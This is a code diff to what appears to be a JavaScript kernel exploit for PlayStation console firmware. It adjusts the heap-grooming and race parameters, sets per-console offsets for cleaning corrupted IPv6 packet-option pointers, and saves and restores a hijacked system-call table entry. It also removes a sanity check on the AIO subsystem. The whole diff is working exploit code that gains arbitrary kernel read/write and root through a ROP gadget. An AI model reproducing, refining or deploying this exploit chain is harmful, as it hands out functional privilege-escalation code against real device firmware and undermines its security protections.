@@ -136,15 +136,13 @@ const main_core = 7;
 const num_grooms = 0x200;
 const num_handles = 0x100;
 const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
-const num_alias = 10;
+const num_alias = 50; //TODO: check best value here for 9.xx
 const num_races = 100;
 const leak_len = 16;
 const num_leaks = 5;
 const num_clobbers = 8;
 
 let chain = null;
-var nogc = [];
-
 async function init() {
     await rop.init();
     chain = new Chain();
@@ -1461,16 +1459,15 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         die('pipe read failed');
     }
     log('achieved arbitrary kernel read/write');
-
-    // RESTORE: clean corrupt pointer
-     // pktopts.ip6po_rthdr = NULL
-     //ABC Patch
-     const off_ip6po_rthdr = 0x68;
-     const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
-     const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
-     kmem.write64(r_rthdr_p, 0);
-     kmem.write64(w_rthdr_p, 0);
-     log('corrupt pointers cleaned');
+    
+    // RESTORE: clean corrupt pointers
+    // pktopts.ip6po_rthdr = NULL
+    const off_ip6po_rthdr = is_ps4 ? 0x68 : 0x70;
+    const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
+    const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
+    kmem.write64(r_rthdr_p, 0);
+    kmem.write64(w_rthdr_p, 0);
+    log('corrupt pointers cleaned');
 
     /*
     // REMOVE once restore kernel is ready for production
@@ -1508,6 +1505,10 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     // sysent[661] is unimplemented so free for use
     const offset_sysent_661 = 0x1107f00;
     const sysent_661 = kbase.add(offset_sysent_661);
+    const sy_narg = kmem.read32(sysent_661);
+    const sy_call = kmem.read64(sysent_661.add(8));
+    const sy_thrcnt = kmem.read32(sysent_661.add(0x2c));
+
     // .sy_narg = 6
     kmem.write32(sysent_661, 6);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
@@ -1597,6 +1598,13 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('setuid(0)');
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
+
+    log('restore sys_aio_submit()');
+    kmem.write32(sysent_661, sy_narg);
+    // .sy_call = gadgets['jmp qword ptr [rsi]']
+    kmem.write64(sysent_661.add(8), sy_call);
+    // .sy_thrcnt = SY_THR_STATIC
+    kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
     alert("kernel exploit succeeded!");
 }
 
@@ -1618,20 +1626,6 @@ function setup(block_fd) {
         reqs1.write32(0x20 + i*0x28, block_fd);
     }
     aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
-
-    {
-        const reqs1 = make_reqs1(1);
-        const timo = new Word(1);
-        const id = new Word();
-        aio_submit_cmd(AIO_CMD_READ, reqs1.addr, 1, id.addr);
-        chain.do_syscall_clear_errno(
-            'aio_multi_wait', id.addr, 1, _aio_errors_p, 1, timo.addr);
-        const err = chain.errno;
-        if (err !== 60) { // ETIMEDOUT
-            die(`SceAIO system not blocked. errno: ${err}`);
-        }
-        free_aios(id.addr, 1);
-    }
 
     log('heap grooming');
     // chosen to maximize the number of 0x80 malloc allocs per submission
